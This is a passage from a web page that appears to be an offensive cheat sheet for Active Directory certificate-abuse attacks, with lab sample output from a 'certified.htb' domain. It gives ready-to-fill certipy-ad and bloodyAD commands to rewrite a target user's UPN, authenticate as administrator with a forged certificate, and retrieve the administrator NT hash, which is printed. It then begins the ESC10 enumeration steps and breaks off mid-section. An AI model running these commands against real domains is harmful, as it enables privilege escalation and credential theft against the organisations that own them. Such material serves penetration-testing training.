<div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account update -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -user <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -upn <span class="o editable-keyword">&lt;TARGET_USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad account update -u <span class="s1">'management_svc@certified.htb'</span> -p <span class="s1">'Password123!'</span> -dc-ip 10.129.231.186 -user ca_operator -upn ca_operator@certified.htb
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Updating user 'ca_operator':
</span></span></span><span class="line"><span class="cl"><span class="go">    userPrincipalName                   : ca_operator@certified.htb
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully updated 'ca_operator'
</span></span></span></div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account update -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -hashes <span class="o editable-keyword">&lt;HASH&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -user <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -upn <span class="o editable-keyword">&lt;TARGET_USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad account update -u <span class="s1">'management_svc@certified.htb'</span> -hashes a091c1832bcdd4677c28b5a6a1295584 -dc-ip 10.129.231.186 -user ca_operator -upn ca_operator@certified.htb
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Updating user 'ca_operator':
</span></span></span><span class="line"><span class="cl"><span class="go">    userPrincipalName                   : ca_operator@certified.htb
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully updated 'ca_operator'
</span></span></span></div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account update -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -user <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -upn <span class="o editable-keyword">&lt;TARGET_USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad account update -u <span class="s1">'management_svc@certified.htb'</span> -p <span class="s1">'Password123!'</span> -k -dc-host dc01.certified.htb -dc-ip 10.129.231.186 -user ca_operator -upn ca_operator@certified.htb
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Updating user 'ca_operator':
</span></span></span><span class="line"><span class="cl"><span class="go">    userPrincipalName                   : ca_operator@certified.htb
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully updated 'ca_operator'
</span></span></span></div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account update -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -hashes <span class="o editable-keyword">&lt;HASH&gt;</span> -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -user <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -upn <span class="o editable-keyword">&lt;TARGET_USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad account update -u <span class="s1">'management_svc@certified.htb'</span> -hashes a091c1832bcdd4677c28b5a6a1295584 -k -dc-host dc01.certified.htb -dc-ip 10.129.231.186 -user ca_operator -upn ca_operator@certified.htb
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Updating user 'ca_operator':
</span></span></span><span class="line"><span class="cl"><span class="go">    userPrincipalName                   : ca_operator@certified.htb
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully updated 'ca_operator'
</span></span></span></div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account update -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -user <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -upn <span class="o editable-keyword">&lt;TARGET_USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad account update -u <span class="s1">'management_svc@certified.htb'</span> -k -dc-host dc01.certified.htb -dc-ip 10.129.231.186 -user ca_operator -upn ca_operator@certified.htb
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Updating user 'ca_operator':
</span></span></span><span class="line"><span class="cl"><span class="go">    userPrincipalName                   : ca_operator@certified.htb
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully updated 'ca_operator'
</span></span></span></div></pre></div><h4 id="4-get-ntlm-hash">4. Get NTLM Hash</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad auth -pfx administrator.pfx -domain <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad auth -pfx administrator.pfx -domain certified.htb -dc-ip 10.129.231.186
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Certificate identities:
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     SAN UPN: 'Administrator'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using principal: 'administrator@certified.htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Trying to get TGT...
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got TGT
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving credential cache to 'administrator.ccache'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote credential cache to 'administrator.ccache'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Trying to retrieve NT hash for 'administrator'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
</span></span></span></div></pre></div></div></div><p></p>
<hr>
<h3 id="esc10-weak-certificate-mapping-for-schannel-authentication">ESC10: Weak Certificate Mapping for Schannel Authentication</h3>
<p class="tabs">
<button data-tabset="set13" data-tabcontent="tab1" class="active">Linux</button>

</p><div class="tabset-wrapper" data-tabset-group="set13"><div class="tabcontent active" data-tabset="set13" data-tabcontent="tab1"><h4 id="1-check-altsecurityidentities">1. Check altSecurityIdentities</h4>
<div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">bloodyAD -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> --host <span class="o editable-keyword">&lt;DC&gt;</span> get writable --detail
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="go">---[SNIP]---
</span></span></span><span class="line"><span class="cl"><span class="go">altSecurityIdentities: WRITE
</span></span></span><span class="line"><span class="cl"><span class="go">---[SNIP]---
</span></span></span></div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
</span></span><span class="line"><span class="cl"><span class="go">bloodyAD -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p ':<span class="o editable-keyword">&lt;HASH&gt;</span>' -f rc4 -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> --host <span class="o editable-keyword">&lt;DC&gt;</span> get writable --detail
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="go">---[SNIP]---
</span></span></span><span class="line"><span class="cl"><span class="go">altSecurityIdentities: WRITE
</span></span></span><span class="line"><span class="cl"><span class="go">---[SNIP]---
</span></span></span></div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">bloodyAD -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -k --host <span class="o editable-keyword">&lt;DC&gt;</span> get writable --detail
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="go">---[SNIP]---
</span></span></span><span class="line"><span class="cl"><span class="go">altSecurityIdentities: WRITE
</span></span></span><span class="line"><span class="cl"><span class="go">---[SNIP]---
</span></span></span></div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">bloodyAD -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p ':<span class="o editable-keyword">&lt;HASH&gt;</span>' -f rc4 -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -k --host <span class="o editable-keyword">&lt;DC&gt;</span> get writable --detail
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="go">---[SNIP]---
</span></span></span><span class="line"><span class="cl"><span class="go">altSecurityIdentities: WRITE
</span></span></span><span class="line"><span class="cl"><span class="go">---[SNIP]---
</span></span></span></div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">bloodyAD -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -k --host <span class="o editable-keyword">&lt;DC&gt;</span> get writable --detail
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="go">---[SNIP]---
</span></span></span><span class="line"><span class="cl"><span class="go">altSecurityIdentities: WRITE
</span></span></span><span class="line"><span class="cl"><span class="go">---[SNIP]---
</span></span></span></div></pre></div><h4 id="2-check-certificatemappingmethods">2. Check CertificateMappingMethods</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Look <span class="k">for</span> <span class="nv">CertificateMappingMethods</span> <span class="o">=</span> 0x4
</span></span><span class="line"><span class="cl"><span class="go">reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> reg query <span class="s1">'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\'</span>
</span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL
</span></span></span><span class="line"><span class="cl"><span class="go">    EventLogging    REG_DWORD    0x1
</span></span></span><span class="line"><span class="cl"><span class="go">    CertificateMappingMethods    REG_DWORD    0x4
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">---[SNIP]---
</span></span></span></div></pre></div><h4 id="3-check-target-user-upn">3. Check Target User UPN</h4>
<div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -target '<span class="o editable-keyword">&lt;DC&gt;</span>' -dc-ip '<span class="o editable-keyword">&lt;DC_IP&gt;</span>' -user '<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>' read
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -target '<span class="o editable-keyword">&lt;DC&gt;</span>' -dc-ip '<span class="o editable-keyword">&lt;DC_IP&gt;</span>' -user '<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>' read
</span></span></span></code><div class="output-bubble">Sample Output:
